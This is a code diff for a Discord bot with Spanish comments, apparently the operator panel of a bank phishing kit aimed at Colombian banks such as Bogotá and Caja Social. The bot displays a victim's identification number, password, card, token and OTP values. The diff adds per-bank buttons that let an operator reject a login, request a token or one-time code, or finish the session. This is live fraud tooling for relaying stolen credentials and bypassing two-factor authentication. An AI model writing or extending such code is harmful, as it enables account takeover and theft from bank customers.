@@ -38,7 +38,6 @@ client.once(Events.ClientReady, (c) => {
 // HELPERS — Construir embeds y botones
 // ============================================
 
-// Embed inicial (cédula + clave)
 function buildEmbedInicial(banco, bancoKey, datos, sessionId) {
     const { tipo, tipoDoc, identificacion, clave, tarjeta } = datos;
 
@@ -61,7 +60,6 @@ function buildEmbedInicial(banco, bancoKey, datos, sessionId) {
     return embed;
 }
 
-// Embed del TOKEN
 function buildEmbedToken(banco, bancoKey, datos, sessionId, tokenValor) {
     const { tipoDoc, identificacion, clave } = datos;
 
@@ -84,7 +82,6 @@ function buildEmbedToken(banco, bancoKey, datos, sessionId, tokenValor) {
     return embed;
 }
 
-// Embed del OTP
 function buildEmbedOtp(banco, bancoKey, datos, sessionId, otpValor) {
     const { tipoDoc, identificacion, clave } = datos;
 
@@ -107,9 +104,12 @@ function buildEmbedOtp(banco, bancoKey, datos, sessionId, otpValor) {
     return embed;
 }
 
-// Botones del embed INICIAL
+// ============================================
+// BOTONES DEL EMBED INICIAL (después de la clave)
 // - Bogotá: 2 botones (Token / Rechazar)
+// - Caja Social: 3 botones (Rechazar / Token / OTP)
 // - Todos los demás: 2 botones (Rechazar / OTP)
+// ============================================
 function buildButtonsInicial(bancoKey, sessionId) {
     if (bancoKey === 'bogota') {
         return new ActionRowBuilder().addComponents(
@@ -124,7 +124,23 @@ function buildButtonsInicial(bancoKey, sessionId) {
         );
     }
 
-    // Todos los demás bancos: 2 botones (Rechazar / OTP)
+    if (bancoKey === 'caja-social') {
+        return new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+                .setLabel('❌ Rechazar')
+                .setStyle(ButtonStyle.Danger),
+            new ButtonBuilder()
+                .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
+                .setLabel('🔢 Token')
+                .setStyle(ButtonStyle.Primary),
+            new ButtonBuilder()
+                .setCustomId(`OTP|${bancoKey}|${sessionId}`)
+                .setLabel('📱 OTP')
+                .setStyle(ButtonStyle.Success)
+        );
+    }
+
     return new ActionRowBuilder().addComponents(
         new ButtonBuilder()
             .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
@@ -137,8 +153,29 @@ function buildButtonsInicial(bancoKey, sessionId) {
     );
 }
 
-// Botones del embed TOKEN: OTP / Finalizar / Rechazar
+// ============================================
+// BOTONES DEL EMBED TOKEN
+// - Caja Social: 3 botones (Rechazar / OTP / Finalizar)
+// - Otros: 3 botones (OTP / Finalizar / Rechazar)
+// ============================================
 function buildButtonsToken(bancoKey, sessionId) {
+    if (bancoKey === 'caja-social') {
+        return new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+                .setLabel('❌ Rechazar')
+                .setStyle(ButtonStyle.Danger),
+            new ButtonBuilder()
+                .setCustomId(`OTP|${bancoKey}|${sessionId}`)
+                .setLabel('📱 OTP')
+                .setStyle(ButtonStyle.Primary),
+            new ButtonBuilder()
+                .setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`)
+                .setLabel('✅ Finalizar')
+                .setStyle(ButtonStyle.Success)
+        );
+    }
+
     return new ActionRowBuilder().addComponents(
         new ButtonBuilder()
             .setCustomId(`OTP|${bancoKey}|${sessionId}`)
@@ -155,8 +192,29 @@ function buildButtonsToken(bancoKey, sessionId) {
     );
 }
 
-// Botones del embed OTP: Rechazar / Finalizar (2 botones)
+// ============================================
+// BOTONES DEL EMBED OTP
+// - Caja Social: 3 botones (Rechazar / Finalizar / Token)
+// - Otros: 2 botones (Rechazar / Finalizar)
+// ============================================
 function buildButtonsOtp(bancoKey, sessionId) {
+    if (bancoKey === 'caja-social') {
+        return new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+                .setLabel('❌ Rechazar')
+                .setStyle(ButtonStyle.Danger),
+            new ButtonBuilder()
+                .setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`)
+                .setLabel('✅ Finalizar')
+                .setStyle(ButtonStyle.Success),
+            new ButtonBuilder()
+                .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
+                .setLabel('🔢 Token')
+                .setStyle(ButtonStyle.Primary)
+        );
+    }
+
     return new ActionRowBuilder().addComponents(
         new ButtonBuilder()
             .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
